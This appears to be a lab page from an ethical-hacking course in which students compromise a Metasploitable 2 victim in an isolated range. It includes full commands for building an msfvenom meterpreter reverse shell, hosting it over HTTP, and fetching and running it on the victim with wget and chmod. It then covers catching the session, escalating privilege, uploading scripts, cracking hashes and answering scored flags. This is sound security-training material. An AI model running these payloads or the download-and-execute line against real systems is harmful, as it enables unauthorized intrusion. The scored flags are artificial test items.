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21 — How to Gain and Escalate a Shell with a Custom Payload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21 focuses on: building a payload, gaining a session, escalating privilege, and operating on a compromised host with Metasploit.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Identify a target and a matching payload with Metasploit.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payload with msfvenom and host it for delivery.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Catch a session with a multi/handler and interact via Meterpreter.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Escalate privilege, modify the file system, and upload and execute a script on the target.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(4,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msfvenom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Payload generation — CEH “System Hacking” domain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msfconsole / multi-handler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Catching and managing sessions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Meterpreter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Post-exploitation interaction with the compromised host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John the Ripper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Cracking any hashes recovered post-exploitation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Turning a confirmed weakness into a working session, then operating within scope, is the demonstrated-impact step a vulnerability assessment builds toward.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Vulnerable Linux victim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10.30.0.30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Metasploitable 2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msfadmin / msfadmin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Identify a target and a matching payload with Metasploit.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Build a payload with msfvenom and host it for delivery.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Catch a session with a multi/handler and interact via Meterpreter.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Escalate privilege, modify the file system, and upload and execute a script on the target.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“Now the part the board remembers,” Nadia says. “Not ‘it could be exploited’ — an actual session on the box. Build the payload yourself so you understand every option, catch the shell, and show what an attacker does once inside.”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is firm on scope. “The victim container (10.30.0.30), nothing else, ever. A shell you can't explain is worse than no shell.”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build and deliver a payload to the victim, obtain a Meterpreter session, escalate, and operate on the host within scope.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Confirm the target is up and note its services.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nmap -sV 10.30.0.30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exploitable services on the victim.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Build a Linux reverse-shell payload.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msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.30.0.10 LPORT=4444 -f elf -o /root/shell.elf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shell.elf written.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Host the payload for delivery.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cd /root &amp;&amp; python3 -m http.server 8080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an HTTP server serving shell.elf.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Start the handler (new terminal).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msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.30.0.10; set LPORT 4444; run'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handler listening.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Deliver and run the payload on the victim, then catch the session.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on victim: wget http://10.30.0.10:8080/shell.elf -O /tmp/s; chmod +x /tmp/s; /tmp/s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 Meterpreter session opening on the attacker.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Operate on the host.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sysinfo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getuid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upload /root/task.sh /tmp/task.sh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shell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host details, your uid, and your script on the target.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From the session, find and read one sensitive file within scope, and note how you would detect this activity as a defender.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Open the attacker and confirm the target with a quick scan of the victim (10.30.0.30).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Choose a suitable payload and build it with msfvenom (a Linux reverse shell for the Metasploitable victim), setting LHOST to the attacker (10.30.0.10).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Host the payload (Metasploit's web server, or a simple HTTP server) so the target can retrieve it.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Start a multi/handler in msfconsole matching your payload, then trigger/deliver the payload to open a session.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In the session, enumerate the host, escalate privilege where possible, and read the current user/ID.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Modify the file system within scope: upload a small bash script and execute it, then confirm its output.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7. If you recover any password hashes, crack them with John (your own authorized target only).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msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.30.0.10 LPORT=4444 -f elf -o shell.elf. Host it with python3 -m http.server. Catch it: use exploit/multi/handler, set PAYLOAD to match, set LHOST/LPORT, run. In Meterpreter: sysinfo, getuid, upload, shell. On Metasploitable, a direct service exploit (e.g. vsftpd) is an alternative route to the same session.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Prove impact on the victim — and only the victim. Get a session and answer the flags.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payload type you used to get a session.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20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uid/username your session runs as (and after any escalation).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output of a script you uploaded and executed on the target.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50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Metasploit collapses the gap between ‘vulnerable’ and ‘compromised,’ which is exactly why scope discipline is the first skill. Building the payload by hand teaches what each option does; the session is the artifact the board can't wave away. Its legitimacy rests entirely on ‘only the host we were authorized to test.’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msfvenom payload build (showing payload, LHOST, format).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the multi/handler catching the session.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Meterpreter command proving access (sysinfo / getuid).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your uploaded script executing on the target.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report: the access gained, what you demonstrated, and the remediation,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lab21.txt , then last -n 10 &gt;&gt; lab21.txt , then  cat lab21.txt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Metasploit Unleashed (Offensive Security)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msfvenom documentation (Rapid7)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Meterpreter command reference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Privilege Escalation (TA0004)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msfvenom &amp; multi/handler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